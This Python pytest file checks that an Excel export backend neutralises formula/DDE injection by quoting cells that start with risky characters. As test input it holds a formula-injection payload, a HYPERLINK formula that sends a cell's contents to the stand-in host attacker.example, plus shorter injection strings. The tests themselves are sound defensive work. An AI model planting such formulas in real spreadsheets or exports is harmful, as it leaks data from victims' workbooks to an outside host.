"""Excel formula/DDE injection sanitization tests.

Covers the shared `sanitize_cell_value()` per risky leading character
plus the `generate_file()` write path: reopened workbook cells stored
as literal text (not evaluated formulas), numeric/datetime values
untouched, and sanitization under column filtering.
"""

from __future__ import annotations

import io
from datetime import datetime

import pytest

openpyxl = pytest.importorskip("openpyxl")

from lexigram.admin.services.export.adapters.excel import ExcelExportBackend
from lexigram.admin.services.export.sanitize import (
    RISKY_LEADING_CHARS,
    sanitize_cell_value,
)
from lexigram.admin.services.export.scheduler import ExportFormat, ExportJob


class _StubStorage:
    """Captures upload payloads."""

    def __init__(self) -> None:
        self.uploaded: bytes | None = None

    async def upload(
        self, file_path: str, content: bytes, content_type: str
    ) -> None:
        self.uploaded = content


@pytest.mark.parametrize(
    "raw",
    [
        '=HYPERLINK("http://attacker.example/c?x="&A2,"Open")',
        "+1+1",
        "-SUM(A1:A9)",
        "@cmd",
        "\t=1",
        "\r=1",
    ],
)
def test_risky_leading_chars_are_prefixed(raw: str) -> None:
    """Every risky leading character gets a leading single quote."""
    assert raw[0] in RISKY_LEADING_CHARS
    assert sanitize_cell_value(raw) == f"'{raw}"


@pytest.mark.parametrize("value", ["Admin", "123", " spaced", ""])
def test_non_risky_strings_pass_through(value: str) -> None:
    """Strings not starting with a risky character are unchanged."""
    assert sanitize_cell_value(value) is value


@pytest.mark.parametrize("value", [1, -1, True, False, None])
def test_non_strings_pass_through(value: object) -> None:
    """Non-string values pass through unchanged and same type."""
    assert sanitize_cell_value(value) is value


@pytest.mark.asyncio
async def test_generate_file_stores_hostile_payloads_as_text() -> None:
    """XLSX data-row cells reopen as prefixed literal text, not formulas."""
    backend = ExcelExportBackend()
    job = ExportJob(
        job_id="job-1",
        resource_name="tickets",
        format=ExportFormat.EXCEL,
    )
    data = [
        {
            "name": '=HYPERLINK("http://attacker.example/c?x="&A2,"Open")',
            "amount": "-1",
            "agg": "+1+1",
            "fn": "@SUM(1,1)",
            "count": 3,
            "delta": -1,
        }
    ]
    storage = _StubStorage()

    await backend.generate_file(job, data, storage, "exports")

    assert storage.uploaded is not None
    workbook = openpyxl.load_workbook(io.BytesIO(storage.uploaded), data_only=True)
    worksheet = workbook.active
    assert worksheet.cell(row=1, column=1).value == "name"
    assert (
        worksheet.cell(row=2, column=1).value
        == "'=HYPERLINK(\"http://attacker.example/c?x=\"&A2,\"Open\")"
    )
    assert worksheet.cell(row=2, column=2).value == "'-1"
    assert worksheet.cell(row=2, column=3).value == "'+1+1"
    assert worksheet.cell(row=2, column=4).value == "'@SUM(1,1)"


@pytest.mark.asyncio
async def test_generate_file_preserves_numeric_and_datetime_types() -> None:
    """Numeric cells stay numbers; datetime cells keep their format."""
    backend = ExcelExportBackend()
    job = ExportJob(
        job_id="job-2",
        resource_name="tickets",
        format=ExportFormat.EXCEL,
    )
    data = [{"count": 3, "delta": -1, "created": datetime(2026, 8, 18, 12, 30, 45)}]
    storage = _StubStorage()

    await backend.generate_file(job, data, storage, "exports")

    assert storage.uploaded is not None
    workbook = openpyxl.load_workbook(io.BytesIO(storage.uploaded), data_only=True)
    worksheet = workbook.active
    count_cell = worksheet.cell(row=2, column=1)
    delta_cell = worksheet.cell(row=2, column=2)
    created_cell = worksheet.cell(row=2, column=3)
    assert count_cell.value == 3
    assert isinstance(count_cell.value, int)
    assert delta_cell.value == -1
    assert isinstance(delta_cell.value, int)
    assert isinstance(created_cell.value, datetime)
    assert created_cell.number_format == "YYYY-MM-DD HH:MM:SS"


@pytest.mark.asyncio
async def test_generate_file_keeps_sanitization_with_column_filter() -> None:
    """Column filtering does not bypass sanitization of the selected column."""
    backend = ExcelExportBackend()
    job = ExportJob(
        job_id="job-3",
        resource_name="tickets",
        format=ExportFormat.EXCEL,
        columns=["name"],
    )
    data = [{"name": "=1+1", "count": 3}]
    storage = _StubStorage()

    await backend.generate_file(job, data, storage, "exports")

    assert storage.uploaded is not None
    workbook = openpyxl.load_workbook(io.BytesIO(storage.uploaded), data_only=True)
    worksheet = workbook.active
    assert worksheet.max_column == 1
    assert worksheet.cell(row=1, column=1).value == "name"
    assert worksheet.cell(row=2, column=1).value == "'=1+1"